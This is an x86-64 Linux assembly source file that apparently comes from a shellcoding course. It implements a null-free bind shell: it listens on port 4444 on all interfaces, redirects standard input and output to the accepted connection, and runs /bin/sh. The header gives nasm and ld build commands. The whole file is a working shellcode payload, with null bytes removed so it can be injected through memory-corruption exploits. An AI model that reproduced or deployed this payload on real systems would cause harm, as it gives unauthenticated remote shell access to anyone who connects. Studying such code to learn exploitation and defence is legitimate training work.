; original code by http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
; edited David @InfinitelyManic
; remove nulls from bind shell code
; nasm -f elf64 -g -F dwarf bindshell_rm_nulls.s -o bindshell_rm_nulls.o  && ld bindshell_rm_nulls.o -o bindshell_rm_nulls
;
section .text
        global _start

_start:
        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

        xor rax, rax
        mov al, 41

        xor rdi, rdi
        inc edi
        inc edi

        xor rsi, rsi
        inc rsi

        xor rdx, rdx
        syscall

        ; copy socket descriptor to rdi for future use
        mov rdi, rax


        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)

        xor rax, rax
        push rax
        mov dword [rsp-4], eax
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], -1            ; 0xffff
        add word [rsp-8], 3             ; -1 + 3  = 2
        sub rsp, 8

        ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
        ; syscall number 49
        xor rax, rax
        mov al, 49

        mov rsi, rsp
        xor rdx, rdx
        mov dl, 16
        syscall


        ; listen(sock, MAX_CLIENTS)
        ; syscall number 50
        xor rax, rax
        mov al, 50
        mov rsi, -1
        add rsi, 3
        syscall


        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ; syscall number 43
        xor rax, rax
        mov al, 43
        sub rsp, 16
        mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

        ; store the client socket description
        mov r9, rax

        ; close parent

        xor rax, rax
        mov al, 3
        syscall
        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        xor rax, rax
        mov al, 33
        xor rsi, rsi
        syscall

        xor rax, rax
        mov al, 33
        xor rsi, rsi
        inc rsi
        syscall

        xor rax, rax
        mov al, 33
        mov rsi, -1
        add rsi, 3
        syscall


        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp
                ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

